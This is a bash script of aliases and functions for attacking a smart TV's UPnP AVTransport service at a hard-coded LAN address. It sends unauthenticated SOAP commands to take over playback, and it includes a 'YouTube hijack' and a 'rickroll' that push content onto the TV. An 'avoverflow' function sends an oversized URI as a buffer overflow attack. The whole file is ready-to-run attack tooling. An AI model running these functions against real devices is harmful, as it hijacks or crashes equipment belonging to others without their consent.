#!/bin/bash
# AVTransport Automation Aliases and Functions
# For rapid exploitation of UPnP AVTransport services

# Target configuration
TV_IP="192.168.200.44"
TV_PORT="38400"
TV_CONTROL_URL="http://${TV_IP}:${TV_PORT}/upnp/control/mingusavtr"
SERVICE_TYPE="urn:schemas-upnp-org:service:AVTransport:1"

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Generic SOAP request function
avtransport_soap() {
    local action="$1"
    local soap_body="$2"

    echo -e "${BLUE}[*] Sending ${action} to ${TV_IP}:${TV_PORT}${NC}"

    curl -s -X POST "${TV_CONTROL_URL}" \
         -H "SOAPAction: \"${SERVICE_TYPE}#${action}\"" \
         -H "Content-Type: text/xml; charset=utf-8" \
         -d "${soap_body}" | grep -o "<[^>]*>" | head -10

    echo -e "${GREEN}[+] ${action} completed${NC}"
}

# Get current transport state
alias avstatus='echo -e "${YELLOW}Getting AVTransport status...${NC}"; avtransport_soap "GetTransportInfo" "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:GetTransportInfo xmlns:u=\"${SERVICE_TYPE}\"><InstanceID>0</InstanceID></u:GetTransportInfo></s:Body></s:Envelope>"'

# Set media URI (accepts URI as argument)
avseturi() {
    local uri="$1"
    if [ -z "$uri" ]; then
        echo -e "${RED}Error: No URI provided${NC}"
        echo "Usage: avseturi <media_url>"
        return 1
    fi

    echo -e "${YELLOW}Setting URI: ${uri}${NC}"
    avtransport_soap "SetAVTransportURI" "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:SetAVTransportURI xmlns:u=\"${SERVICE_TYPE}\"><InstanceID>0</InstanceID><CurrentURI>${uri}</CurrentURI><CurrentURIMetaData></CurrentURIMetaData></u:SetAVTransportURI></s:Body></s:Envelope>"
}

# Start playback
alias avplay='echo -e "${YELLOW}Starting playback...${NC}"; avtransport_soap "Play" "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:Play xmlns:u=\"${SERVICE_TYPE}\"><InstanceID>0</InstanceID><Speed>1</Speed></u:Play></s:Body></s:Envelope>"'

# Stop playback
alias avstop='echo -e "${YELLOW}Stopping playback...${NC}"; avtransport_soap "Stop" "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:Stop xmlns:u=\"${SERVICE_TYPE}\"><InstanceID>0</InstanceID></u:Stop></s:Body></s:Envelope>"'

# Pause playback
alias avpause='echo -e "${YELLOW}Pausing playback...${NC}"; avtransport_soap "Pause" "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:Pause xmlns:u=\"${SERVICE_TYPE}\"><InstanceID>0</InstanceID></u:Pause></s:Body></s:Envelope>"'

# Quick YouTube hijack (requires valid YouTube URL)
avyoutube() {
    local input="$1"
    if [ -z "$input" ]; then
        echo -e "${RED}Error: No YouTube URL provided${NC}"
        echo "Usage: avyoutube <youtube_url>"
        echo "Examples:"
        echo "  avyoutube https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        echo "  avyoutube https://youtu.be/dQw4w9WgXcQ"
        return 1
    fi

    # Validate YouTube URL
    if echo "$input" | grep -qE "(youtube\.com/watch\?|youtu\.be/)" 2>/dev/null; then
        echo -e "${RED}⚠️  Hijacking TV with YouTube URL: ${input}${NC}"
        avseturi "$input"
        sleep 1
        avplay
    else
        echo -e "${YELLOW}⚠️  Not a valid YouTube URL: ${input}${NC}"
        echo -e "${BLUE}💡 Use avseturi for non-YouTube URLs${NC}"
        echo "Example: avseturi http://example.com/video.mp4"
        return 1
    fi
}

# Buffer overflow attack
avoverflow() {
    local size="${1:-2000}"
    local overflow_uri="http://$(python3 -c "print('A' * $size)").mp4"

    echo -e "${RED}💥 Attempting buffer overflow with ${size} bytes${NC}"
    avseturi "$overflow_uri"
}

# Quick attack combinations
alias avrickroll='echo -e "${RED}🎪 Rickrolling the TV!${NC}"; avseturi "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; sleep 1; avplay'
alias avtest='echo -e "${BLUE}Testing AVTransport connectivity...${NC}"; avstatus'
alias avkill='echo -e "${RED}🔥 Killing TV playback!${NC}"; avstop'

# Display help
avhelp() {
    echo -e "${GREEN}AVTransport Automation Commands:${NC}"
    echo ""
    echo "Basic Commands:"
    echo "  avstatus       - Get current transport state"
    echo "  avplay         - Start playback"
    echo "  avstop         - Stop playback"
    echo "  avpause        - Pause playback"
    echo ""
    echo "Media Control:"
    echo "  avseturi <url> - Set media URI"
    echo "  avyoutube <url> - Set YouTube URL and play"
    echo ""
    echo "Attacks:"
    echo "  avoverflow [size] - Buffer overflow attack (default 2000 bytes)"
    echo "  avrickroll     - Rickroll the TV"
    echo ""
    echo "Utilities:"
    echo "  avtest         - Test connectivity"
    echo "  avkill         - Emergency stop"
    echo "  avhelp         - Show this help"
    echo ""
    echo -e "${YELLOW}Target: ${TV_IP}:${TV_PORT}${NC}"
}

# Auto-load aliases when sourced
echo -e "${GREEN}AVTransport aliases loaded! Type 'avhelp' for commands.${NC}"

# Note: Functions are available when sourced
# For use in scripts, source this file first